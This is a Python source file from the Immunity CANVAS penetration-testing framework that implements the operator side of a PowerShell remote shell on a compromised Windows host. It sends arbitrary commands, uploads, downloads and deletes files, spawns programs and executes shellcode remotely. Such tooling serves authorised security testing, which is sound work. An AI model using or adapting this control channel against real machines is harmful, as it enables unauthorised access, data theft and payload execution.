#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2015
# http://www.immunityinc.com/CANVAS/ for more information

"""
powershelllistener.py

Listener for connections to Powershell servers
"""
import os, sys
from shellserver import shellserver
from canvaserror import *
from exploitutils import *
import time
from libs.canvasos import canvasos
from canvaserror import *
import logging

from MOSDEFSock import MOSDEFSock

DRIVE_TYPES = {"DRIVE_UNKNOWN"   : 0, "DRIVE_NO_ROOT_DIR" : 1,
               "DRIVE_REMOVABLE" : 2, "DRIVE_FIXED"       : 3,
               "DRIVE_REMOTE"    : 4, "DRIVE_CDROM"       : 5,
               "DRIVE_RAMDISK"   : 6}


class powershelllistener(shellserver):
    def __init__(self, connection , logfunction=None):
        logging.info("New Powershell listener connection: %s" % connection)
        self.engine = None
        self.sent_init_code = False
        shellserver.__init__(self, connection, type="Active", logfunction=logfunction)
        self.connection = connection # already done, but let's make it here as well

        # Interpreter-backed shells are often slower than ones that use native code.
        # If we don't have this, we risk the shell connection breaking due to a timeout.
        if isinstance(self.connection, MOSDEFSock):
            self.connection.timeout = 50
        
        self.interactive = False
        self.psprompt = "PS >"
        self.prompt   = "PSMOSDEF"
        self.na = "This is a Powershell listener - that command is not supported"

    def startup(self):
        """
        Our first stage already loops, so we should be good to go on that.
        """
        return

    def sendraw(self, buf):
        """
        send data to the remote side - reliable
        """
        self.connection.sendall(buf)

    def send_buf(self, buf):
        """
        send data block to remote side
        """
        self.sendraw(str(big_order(len(buf))) + buf)

    def exit(self, code):
        self.send_command(8, str(code))

    def disconnect(self):
        self.send_command(9)
    
    def close(self, arg):
        logging.warning("There is no implementation of close() in powershell mosdef ")
        """
        There isn't really a generic close() possible for powershell
        since it deals with connections via objects and not FDs. For
        that reason, we just do nothing for this call and simply let
        the eventual call to exit() handle disconnections.
        """
        return

    def read_string(self):
        """
        Read a string from the remote side
        """
        size = str2bigendian(reliablerecv(self.connection, 4))
        # print "Read_string - Size " + str(size)
        # XXX: what if we're downloading big files?
        if size == 0xffffffff:
            logging.error("Garbled size value %x" % size)
            return ""
        
        logging.info("Reading data: %d bytes" % size)
        # print "powershelllistener Reading data: %d bytes" %size
        dataarray = []
        if size == 0:
            return ""
        gotsize = 0
        while gotsize < size:
            data = self.connection.recv(size)
            dataarray += [data]
            gotsize += len(data)
        return "".join(dataarray)

    def send_command(self, command, args=""):
        """
        Sends a command to the remote side.
        Format is:
        <size of args in bytes><command as big endian 32 bit integer><args>
        """
        self.sendraw(str(big_order(len(args))) + str(big_order(command)) + str(args))

    def pwd(self):
        """
        Get current working directory
        """
        self.send_command(1)
        ret = self.read_string()
        return ret

    def getcwd(self):
        return self.pwd()

    def runcommand(self, command, pscomm=False):
        """
        Running a command is easy with a shell
        """
        if not command:
            return "You must write a command" #review this message

        #check for powershell or powershell.exe
        #we can't run a remote console in this way

        if command.lower() == "powershell.exe" or command.lower() == "powershell":
           return ""

        #if command.lower() == "powershell" or command.lower() == "ps":
        #   print "[*] Start PS remote console"
        #   try:
        #       self.ps_interact()
        #   except ExitException:
        #       return "Exiting PS Console"
        #   except:
        #       raise

        #command = command.encode('ascii')
        if not pscomm:
            command = "cmd.exe /c " + command

        self.send_command(3, command)
        ret = self.read_string()
        return ret

    def shellcommand(self, command, LFkludge=False):
        x = self.runcommand(command)
        if len(x) > 1:
            rv = 0
        else:
            rv = 1

        return (x, rv)

    def dospawn(self, filename):
        if not filename:
            return "Missing filename"

        # filename = filename.encode('ascii')
        self.send_command(6, filename)
        ret = self.read_string()

        if ret:
            return "%s was spawned" % (filename)
        else:
            return "%s was not spawned due to some kind of error" % (filename)
        
           
    def execute_shellcode(self,shellcode):
        """
        invoke shellcode
        
        """
        print "enter"
        self.send_command(7, shellcode)
       
    def unlink(self, filename):
        return self.dounlink(filename)

    def dounlink(self, filename):
        if not filename:
            return "Missing filename"

        # filename = filename.encode('ascii')
        pscommand = "Test-Path '%s' -PathType Leaf" % filename
        pscommand+= " | % { if ($_ -eq 'True') "
        pscommand+= "{ Remove-Item '%s'; 'File deleted' } else { 'Can not find file' } }" %filename
        pscommand = pscommand.encode('utf-8')

        ret = self.runcommand(pscommand, pscomm=True)

        if "File deleted" in ret:
            return "%s was unlinked" % filename
        elif "Can not find file" in ret:
            return "%s was not unlinked because the file doesn't exist" % filename
        else:
            return "%s was not unlinked due to some kind of error" % filename

    def cd(self, directory):
        if not directory:
            return "Empty string"

        # directory = directory.encode('ascii')
        if not self.interactive:
            logging.info("Changing directory to %s" % directory)
        self.send_command(2, directory) #no confirmation from this one

        return "Changed directory to %s" % directory

    def chdir(self, directory):
        return self.cd(directory)

    def dodir(self, directory):
        if not directory or directory == ".":
            directory = self.getcwd()

        command = "dir " + directory
        # command = command.encode('ascii')
        return self.runcommand(command)

    def upload(self, source, dest=".", destfilename=None, sourceisbuffer=False):
        # if dest is not passed, copy to the current dir
        # Used in the VFS routines
        if dest and dest[-1] not in [ u"/", u"\\"]:
           dest += '\\'

        if sourceisbuffer:
            #source is our upload buffer
            #data=StringIO.StringIO(source)
            data=source
            # is source is our buffer you need to set a destfilename
            if not destfilename:
                e = "Error: You must set the destiny filename"
                logging.error(e)
                raise NodeCommandError(e)
        else:
            try:
                fp = file(source,"rb")
                data = fp.read()
                fp.close()
            except IOError, i:
                e = "Error reading local file: %s" % str(i)
                logging.error(e)
                raise NodeCommandError(e)


        if destfilename:
            destfilename = dest + destfilename
        else:
            destfilename = dest + strip_leading_path(source)

        destfilename = destfilename.encode('utf-8')
        request = int2str32(len(destfilename)) + destfilename + data
        logging.info("Uploading in : %s" % destfilename)
        self.send_command(4, request)

        return "Uploaded %d bytes from %s into %s" % (len(data), "source" if sourceisbuffer else source, destfilename)

    def download(self, source, dest="."):
        ret = None
        rv = True

        # CHECK
        # source = unicode(source)
        # source = source.encode('ascii')

        if os.path.isdir(dest):
            dest = os.path.join(dest, source.replace("/", "_").replace("\\", "_"))

        try:
            outfile = open(dest, "wb")
        except IOError, i:
            e = "Failed to open local file: %s" % str(i)
            logging.error(e)
            rv = False
            ret = e

        if rv:
            self.send_command(5, source)
            data = self.read_string()
            logging.info("Got %d bytes" % len(data))

            try:
                outfile.write(data)
                outfile.close()
                rv = True
                ret = "Read %d bytes of data into %s" % (len(data), dest)
                logging.info(ret)

            except IOError,i:
                e = "Error writing to local file: %s" % str(i)
                logging.error(e)
                ret = e
                rv = False

        if not rv:
            raise NodeCommandError(ret)

        return ret

    def get_shell(self):
        """
        spawn telnet client with remote end hooked to it
        TODO
        """
        pass

    def resolve(self, hostname):
        v = self.runcommand("[System.Net.Dns]::gethostentry(\"%s\").AddressList | ConvertTo-CSV | select-string 'InterNetwork\"'" % hostname, pscomm=True)
        
        ip = v.split(",")[0]
        if ip:
            return ip[3:-1]
        return ""
    
    def getPSVersion(self):
        """
        """
        # with Get-ChildItem Env: we can get local variables
        #v = self.runcommand("cmd /c powershell.exe $PSVERSIONTable.PSVersion")
        v = self.runcommand("$PSVERSIONTable.PSVersion | % { \"$_\" }", pscomm=True)
        v = v.strip().replace("\n", "")
        if v != None:
            logging.info("Got Powershell version: %s" % v)
            return v
        return None

    def getOSInfo(self):
        command = "(Get-WmiObject Win32_OperatingSystem).OSArchitecture"
        command+= ",[Environment]::OSVersion.VersionString"
        command+= ",[Environment]::OSVersion.Version | % {\"$_\"}"
        info = self.runcommand(command,pscomm=True)
        info = info.replace("\r","").split("\n")

        if info != None:
            logging.info("Windows Architecture: %s" % info[0] )
            logging.info("Windows Version String: %s" % info [1])
            logging.info("Windows Version Number: %s" % info[2] )
            return info
        return None

    def findInterfaces(self):
        result = self.runcommand("netsh interface ipv4 show address")
        return result

    def ps_interact(self):
        """
        Powershell interactive console
        """
        #We use print in this method due we want it without the format
        #print "Starting interaction. Engine:%s" % self.engine
        self.interactive = True
        pmt = self.psprompt
        while 1:
            if not self.connection:
                print "Connection closed. (No more opened sockets to select on)"
                self.interactive = False
                return 0
            sys.stdout.write(pmt+' ')
            sys.stdout.flush()
            # get input data
            try:
                data = sys.stdin.readline()
                try:
                    data.decode("utf-8")
                except UnicodeDecodeError:
                    print "Encoding Error" %repr(data)
                    self.interactive = False
                    #need to localize ?
                    #data = self.localize_string(data)
            except (EOFError, KeyboardInterrupt):
                return 0

            #remove \n from end
            data = data.replace("\n","").strip()
            # check for exit
            if data == "quit" or data == "exit":
                #sys.stdout.write("Exiting PS console\n")
                #sys.exit(1)
                #raise ExitException
                self.interactive = False
                return "Exiting PS console"

            #Check if the connection is active
            try:
                if hasattr(self.connection, "isactive"):
                    if self.connection.isactive():
                        print "Handle active connection..."
                        rd = [ self.connection ]
                        pass
                    else:
                        rd, wr, ex = select_stdin_and_socket_for_reading(None)
                else:
                    rd, wr, ex = select_stdin_and_socket_for_reading(self.connection)
            except KeyboardInterrupt:
                self.interactive = False
                return 0

            if self.connection in rd:
                try:
                    buf = self.connection.recv(4)
                except socket.error, errlist:
                    if errlist[0] == 104: # Connection reset by peer
                        buf = ""
                    else:
                        raise
                if buf == "":
                    print "Connection closed. (Connection reset by peer)"
                    self.interactive = False
                    return 0

            # do this to avoid recursion on runcommand
            if data and (data.lower() == "ps" or data.lower() == "powershell"):
                continue

            # If connection still alive send the command
            if data:
                output = self.runcommand(data, pscomm=True)

                if output:
                    print output
        
        self.interactive = False
        return 1

    """
    def interact(self):
        print "*** Interactive Mode ***"
        print "[*] This is a PowerShell Listener you can choose for a command console or powershell command console"
        option = raw_input("[*] Write 'PS' for a powershell console or nothing to continue: ")
        while option and option.lower() != "ps":
            option = raw_input("[*] Write 'PS' for a powershell console or nothing to continue: ")

        if option.lower() == "ps":
            return self.ps_interact()
        else:
            return shellserver.interact(self)
    """
    def interact(self):
        return shellserver.interact(self)

    def getDrives(self):
        result = self.runcommand("Get-WmiObject -Class Win32_LogicalDisk | Format-List DeviceID,DriveType ", pscomm=True)
        #result.encode('ascii')
        #print result
        drives = []
        aresult = result.replace("\r"," ").split("\n")
        drvid = ""
        drvtype = ""
        for line in aresult:
            if "DeviceID" in line:
                drive = line.split(":")
                drvid = drive[1].strip() + ":\\"

            if "DriveType" in line:
                typ = line.split(":")
                drvtype = int(typ[1].strip())

                for key in DRIVE_TYPES.keys():
                    if DRIVE_TYPES[key]==drvtype:
                       drvtype=key
                       break

                drives += [(drvid, drvtype)]

        return drives

    def dostat(self, filename):
        command = "Get-ItemProperty -Path '%s' " % filename
        command += "| fl -property @{n='Attr';e={$_.attributes.Value__}},Length,@{n='Lwt';e={$_.LastWriteTime.ToFileTimeUTC()}},name"
        #
        # Result from this command should be:
        # Attr  : 32
        # Length: 38573 (bytes)
        # Ltw   : XXXXXXXXXX   (miliseconds)
        # Name  : FILENAME
        #
        result = self.runcommand(command, pscomm=True)
        # print result

        aresult = result.replace("\r"," ").split("\n")
        attr = 0
        size = 0
        creationTime = 0
        name = ""
        for line in aresult:
            data = line.split(":")
            if "Attr" in data[0]:
                attr = sint32(data[1])
                continue
            if "Length" in data[0]:
                size = sint32(data[1])
                continue
            if "Lwt" in data[0]:
                creationTime = self.convert_time(data[1].strip())
                continue
            if "Name" in data[0]:
                name = data[1].strip()
                continue

        fileinfo = (attr, size, creationTime, name)

        return fileinfo

    def vfs_dodir(self, directory):
        command = "Get-ChildItem -Path '%s' -force" %directory
        # command+= "| sort-object @{Expression={$_.Attributes}; Ascending=$False},@{Expression={$_.Name}; Ascending=$False}"
        command += "| fl -property @{n='Attr';e={$_.attributes.Value__}},Length,@{n='Lwt';e={$_.LastWriteTime.ToFileTimeUTC()}},name"
        #
        # Result from this command should be a list of:
        # Attr  : 32
        # Length: 38573 (bytes)
        # Ltw   : XXXXXXXXXX   (miliseconds)
        # Name  : FILENAME
        #
        result = self.runcommand(command, pscomm=True)
        # print "Result :" + result

        aresult = result.replace("\r"," ").split("\n")
        countfile = 0
        files = []

        attr = ""
        size = 0
        creationTime = ""
        name = ""
        for line in aresult:
            data = line.split(":")
            if "Attr" in data[0]:
                attr = sint32(data[1])
                continue
            if "Length" in data[0]:
                size = sint32(data[1])
                continue
            if "Lwt" in data[0]:
                creationTime = self.convert_time(data[1].strip())
                continue
            if "Name" in data[0]:
                name = data[1].strip()

            if attr and creationTime and name:
                #print "append: " + str((attr, size, creationTime, name))
                files.append((attr, size, creationTime, name))
                attr = 0
                creationTime = 0
                size = 0
                filename = ""

        # if error should return this:
        # return (-1, [error, directory])

        # print "files : " + str(files)
        # Use reverse to show the list like windows
        files.reverse()
        return files

    def convert_time(self, nano):
        # converts 64-bit integer specifying the time in nanoseconds
        # which have passed since January 1, 1601.
        d = 116444736000000000L # difference between 1601 and 1970
        # we divide by 10million to convert to seconds
        return (long(nano)-d)/10000000


if __name__=="__main__":
    p=powershelllistener()
